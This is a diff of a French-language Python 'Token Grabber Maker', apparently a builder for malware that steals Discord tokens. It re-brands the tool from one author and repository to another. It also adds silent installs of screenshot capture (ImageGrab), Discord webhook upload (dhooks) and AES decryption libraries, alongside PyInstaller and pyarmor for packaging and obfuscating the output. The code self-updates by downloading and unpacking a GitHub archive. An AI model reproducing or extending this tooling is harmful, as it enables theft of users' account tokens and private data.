@@ -7,36 +7,45 @@ import sys
 try:
     import requests
 except:
-    print("Installation du module requests en cours...")
     os.system(f"{sys.executable} -m pip install requests")
     import requests
 try:
     import PySimpleGUI as sg
 except:
-    print("Installation du module PySimpleGUI en cours...")
     os.system(f"{sys.executable} -m pip install pysimplegui")
     import PySimpleGUI as sg
 try:
     import PyInstaller.__main__
 except:
-    print("Installation du module pyarmor en cours...")
     os.system(f"{sys.executable} -m pip install pyinstaller")
 try:
     from pyarmor.pyarmor import main
 except:
-    print("Installation du module pyarmor en cours...")
     os.system(f"{sys.executable} -m pip install pyarmor")
+try:
+    from PIL import ImageGrab
+except:
+    os.system(f"{sys.executable} -m pip install pillow")
+try:
+    from dhooks import Webhook, File
+except:
+    os.system(f"{sys.executable} -m pip install dhooks")
+try:
+    from Crypto.Cipher import AES
+except:
+    os.system(f"{sys.executable} -m pip install pycryptodome")
+
 
 def build():
-    version = requests.get("https://raw.githubusercontent.com/Teobre/TokenGrabberMaker/main/Files/version")
-    ctypes.windll.kernel32.SetConsoleTitleW(f"Token Grabber Maker | Version {version.text} | Créé par Teobre#0787")
-    if version.text != "1.0.6\n":
+    version = requests.get("https://raw.githubusercontent.com/IDRALOU/TokenGrabberMaker/main/Files/version")
+    ctypes.windll.kernel32.SetConsoleTitleW(f"Token Grabber Maker | Version {version.text} | Créé par IDRALOU#6966")
+    if version.text != "1.0.7\n":
         print("Une nouvelle version est disponible, le téléchargement est en cours.")
-        ctypes.windll.kernel32.SetConsoleTitleW(f"Token Grabber Maker | Mise à jour en cours... | Créé par Teobre#0787")
-        new_version = requests.get("https://github.com/Teobre/TokenGrabberMaker/archive/main.zip")
+        ctypes.windll.kernel32.SetConsoleTitleW(f"Token Grabber Maker | Mise à jour en cours... | Créé par IDRALOU#6966")
+        new_version = requests.get("https://github.com/IDRALOU/TokenGrabberMaker/archive/main.zip")
         with open("TokenGrabberMaker.zip", 'wb') as file:
             file.write(new_version.content)
-        ctypes.windll.kernel32.SetConsoleTitleW("Token Grabber Maker | Mise à jour terminée | Créé par Teobre#0787")
+        ctypes.windll.kernel32.SetConsoleTitleW("Token Grabber Maker | Mise à jour terminée | Créé par IDRALOU#6966")
         shutil.unpack_archive("TokenGrabberMaker.zip")
         os.remove("TokenGrabberMaker.zip")
         shutil.rmtree("Files")
@@ -49,7 +58,7 @@ def build():
         | | ___ | | _____ _ __   | |  __ _ __ __ _| |__ | |__   ___ _ __  | \  / | __ _| | _____ _ __ 
         | |/ _ \| |/ / _ \ '_ \  | | |_ | '__/ _` | '_ \| '_ \ / _ \ '__| | |\/| |/ _` | |/ / _ \ '__|
         | | (_) |   <  __/ | | | | |__| | | | (_| | |_) | |_) |  __/ |    | |  | | (_| |   <  __/ |   
-        |_|\___/|_|\_\___|_| |_|  \_____|_|  \__,_|_.__/|_.__/ \___|_|    |_|  |_|\__,_|_|\_\___|_|   by Teobre#0787
+        |_|\___/|_|\_\___|_| |_|  \_____|_|  \__,_|_.__/|_.__/ \___|_|    |_|  |_|\__,_|_|\_\___|_|   by IDRALOU#6966
                                                                                                                                                                                      
     """)
     layout = [
